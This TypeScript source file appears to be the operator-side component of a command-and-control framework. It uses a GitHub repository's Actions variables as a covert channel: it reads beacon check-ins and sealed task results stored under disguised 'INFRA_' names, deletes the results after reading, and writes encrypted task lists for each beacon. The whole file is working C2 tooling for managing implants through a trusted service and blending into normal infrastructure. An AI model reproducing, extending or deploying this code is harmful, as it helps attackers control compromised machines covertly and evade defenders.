import { createRequire } from "node:module";
import type { Octokit } from "@octokit/rest";
import type _SodiumModule from "libsodium-wrappers";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import type { TaskQueue } from "../TaskQueue.ts";
import {
  base64ToBytes,
  encryptForBeacon,
  openSealBox,
} from "../crypto/sodium.ts";
import {
  DurablePollState,
  PollRunner,
  repositoryPollScope,
} from "../lib/PollRunner.ts";
import { collectGitHubPages } from "../lib/GitHubPagination.ts";
import { sha256Hex } from "../store/index.ts";
import {
  assertAcceptedResult,
  checkinAuthorizesTaskDelivery,
  parseCheckinPayload,
  parseTaskResult,
  type SecureChannelServices,
} from "./ChannelServices.ts";
import {
  claimDeliveries,
  finishDeliveries,
  processIncomingArtifact,
  rejectArtifact,
} from "./ChannelRuntime.ts";

const sodium = createRequire(import.meta.url)(
  "libsodium-wrappers",
) as typeof _SodiumModule;

interface ActionsChannelOpts {
  owner: string;
  repo: string;
  token: string;
  operatorSecretKey: Uint8Array;
  pollIntervalMs: number;
  octokit: Octokit;
}

export class ActionsChannel {
  private readonly runner: PollRunner;
  private readonly ackProgress: DurablePollState;
  private readonly resultProgress: DurablePollState;

  constructor(
    private readonly registry: BeaconRegistry,
    private readonly queue: TaskQueue,
    private readonly opts: ActionsChannelOpts,
    private readonly services: SecureChannelServices,
  ) {
    const scope = repositoryPollScope(opts.owner, opts.repo);
    this.ackProgress = new DurablePollState(
      services.store,
      "actions-ack-poll",
      scope,
    );
    this.resultProgress = new DurablePollState(
      services.store,
      "actions-result-poll",
      scope,
    );
    this.runner = new PollRunner({
      name: "ActionsChannel",
      intervalMs: opts.pollIntervalMs,
      poll: () => this.poll(),
      onError: (error) => {
        console.error(
          "[ActionsChannel] Poll error:",
          error instanceof Error ? error.message : String(error),
        );
      },
    });
  }

  start(): void {
    this.runner.start();
    console.log("[ActionsChannel] Started polling");
  }

  async stop(): Promise<void> {
    await this.runner.stop();
    console.log("[ActionsChannel] Stopped");
  }

  private async poll(): Promise<void> {
    const { owner, repo } = this.opts;
    const deliveryEligible = await this.processAckVariables(owner, repo);
    await this.processResultVariables(owner, repo);
    await this.deliverPendingTasks(owner, repo, deliveryEligible);
  }

  private async listVariables(owner: string, repo: string): Promise<any[]> {
    return collectGitHubPages(
      (page, per_page) =>
        this.opts.octokit.rest.actions.listRepoVariables({
          owner,
          repo,
          page,
          per_page,
        }),
      (response) => ((response.data as any).variables ?? []) as any[],
    );
  }

  private async processAckVariables(
    owner: string,
    repo: string,
  ): Promise<Map<string, string>> {
    const deliveryEligible = new Map<string, string>();
    let variables: any[];
    try {
      variables = await this.listVariables(owner, repo);
    } catch (error) {
      console.warn(
        "[ActionsChannel] Failed to list variables:",
        (error as Error).message,
      );
      return deliveryEligible;
    }

    for (const variable of sortArtifacts(variables)) {
      const name = String(variable.name ?? "");
      if (!name.startsWith("INFRA_STATUS_")) continue;
      const id8 = name.slice("INFRA_STATUS_".length);
      if (!id8) continue;

      try {
        const serialized = String(variable.value ?? "");
        const version =
          variable.updated_at ??
          variable.created_at ??
          sha256Hex(serialized);
        const messageId =
          `ack:${name}:${String(version)}:${sha256Hex(serialized)}`;
        const processed = await processIncomingArtifact(
          this.services,
          this.ackProgress,
          {
            messageId,
            payload: serialized,
            cursor: artifactTimestamp(variable),
          },
          "malformed Actions ACK variable",
          () => {
            const checkin = parseCheckinPayload(serialized);
            if (
              !checkin.beaconId.toUpperCase().startsWith(id8.toUpperCase())
            ) {
              rejectArtifact(
                "ACK variable prefix does not match signed beaconId",
              );
            }
            return checkin;
          },
          async (checkin) => {
            const status =
              await this.services.identities.verifyAndRegisterCheckin(
              checkin,
              checkin.beaconId,
              3,
            );
            return {
              outcome: checkinAuthorizesTaskDelivery(status)
                ? "accepted"
                : "duplicate",
              beaconId: checkin.beaconId,
            };
          },
        );
        if (processed.status === "conflicting_duplicate") {
          rejectArtifact("conflicting ACK artifact");
        }
        if (
          processed.status === "processed" &&
          processed.outcome === "accepted" &&
          processed.value
        ) {
          deliveryEligible.set(id8, processed.value.beaconId);
        }
      } catch (error) {
        console.warn(
          "[ActionsChannel] ACK processing error:",
          (error as Error).message,
        );
      }
    }
    return deliveryEligible;
  }

  private async processResultVariables(
    owner: string,
    repo: string,
  ): Promise<void> {
    let variables: any[];
    try {
      variables = await this.listVariables(owner, repo);
    } catch (error) {
      console.warn(
        "[ActionsChannel] Failed to list variables:",
        (error as Error).message,
      );
      return;
    }

    for (const variable of sortArtifacts(variables)) {
      const name = String(variable.name ?? "");
      if (!name.startsWith("INFRA_RESULT_")) continue;
      const taskId8 = name.slice("INFRA_RESULT_".length);
      if (!taskId8) continue;

      try {
        const sealed = String(variable.value ?? "").trim();
        await sodium.ready;
        const operatorPublicKey = sodium.crypto_scalarmult_base(
          this.opts.operatorSecretKey,
        );
        const version =
          variable.updated_at ??
          variable.created_at ??
          sha256Hex(sealed);
        const messageId = `result:${name}:${String(version)}`;
        const processed = await processIncomingArtifact(
          this.services,
          this.resultProgress,
          {
            messageId,
            payload: sealed,
            cursor: artifactTimestamp(variable),
          },
          "malformed Actions result variable",
          async () => {
            if (!sealed) rejectArtifact("result variable is empty");
            const plaintext = new TextDecoder().decode(
              await openSealBox(
                sealed,
                operatorPublicKey,
                this.opts.operatorSecretKey,
              ),
            );
            const result = parseTaskResult(plaintext);
            if (
              !result.taskId.toUpperCase().startsWith(taskId8.toUpperCase())
            ) {
              rejectArtifact(
                "result variable prefix does not match signed taskId",
              );
            }
            return result;
          },
          async (result) => {
            const accepted = assertAcceptedResult(
              await this.services.tasks.acceptSignedResult(
                result,
                result.beaconId,
                {
                  channel: "actions",
                  messageId,
                  payloadDigest: sha256Hex(sealed),
                },
              ),
            );
            return {
              outcome: accepted,
              beaconId: result.beaconId,
              taskId: result.taskId,
            };
          },
        );
        if (processed.status === "conflicting_duplicate") {
          rejectArtifact("conflicting result artifact");
        }
        if (processed.outcome !== "rejected") {
          await this.opts.octokit.rest.actions.deleteRepoVariable({
            owner,
            repo,
            name,
          });
        }
      } catch (error) {
        console.warn(
          "[ActionsChannel] Result processing error:",
          (error as Error).message,
        );
      }
    }
  }

  private async deliverPendingTasks(
    owner: string,
    repo: string,
    deliveryEligible: ReadonlyMap<string, string>,
  ): Promise<void> {
    for (const [id8, beaconId] of deliveryEligible) {
      const pending = this.queue.getDeliverableTasks(beaconId, "actions");
      if (pending.length === 0) continue;
      const deliveries = claimDeliveries(
        this.services,
        "actions",
        beaconId,
        pending,
        Math.max(this.opts.pollIntervalMs * 2, 60_000),
      );
      if (deliveries.length === 0) continue;
      const beacon = this.registry.get(beaconId);
      if (!beacon) {
        finishDeliveries(
          this.services,
          deliveries,
          "permanent_failure",
          "beacon registry entry is unavailable",
        );
        continue;
      }

      try {
        const encrypted = await encryptForBeacon(
          JSON.stringify(deliveries.map(({ task }) => ({
            taskId: task.taskId,
            kind: task.kind,
            args: task.args,
            ref: task.ref,
          }))),
          await base64ToBytes(beacon.publicKey),
          this.opts.operatorSecretKey,
        );
        const name = `INFRA_JOB_${id8}`;
        try {
          await this.opts.octokit.rest.actions.updateRepoVariable({
            owner,
            repo,
            name,
            value: JSON.stringify(encrypted),
          });
        } catch (error: any) {
          if (error?.status !== 404) throw error;
          await this.opts.octokit.rest.actions.createRepoVariable({
            owner,
            repo,
            name,
            value: JSON.stringify(encrypted),
          });
        }
        finishDeliveries(this.services, deliveries, "delivered");
        this.registry.updateActiveTentacle(beaconId, 3);
      } catch (error) {
        finishDeliveries(
          this.services,
          deliveries,
          "transient_failure",
          error,
        );
        console.warn(
          `[ActionsChannel] Task delivery error for ${beaconId}:`,
          (error as Error).message,
        );
      }
    }
  }
}

function artifactTimestamp(artifact: any): string {
  const candidate = artifact.updated_at ?? artifact.created_at;
  const timestamp = typeof candidate === "string"
    ? new Date(candidate).getTime()
    : Number.NaN;
  return Number.isFinite(timestamp)
    ? new Date(timestamp).toISOString()
    : new Date().toISOString();
}

function sortArtifacts(artifacts: any[]): any[] {
  return [...artifacts].sort((left, right) =>
    artifactTimestamp(left).localeCompare(artifactTimestamp(right))
  );
}
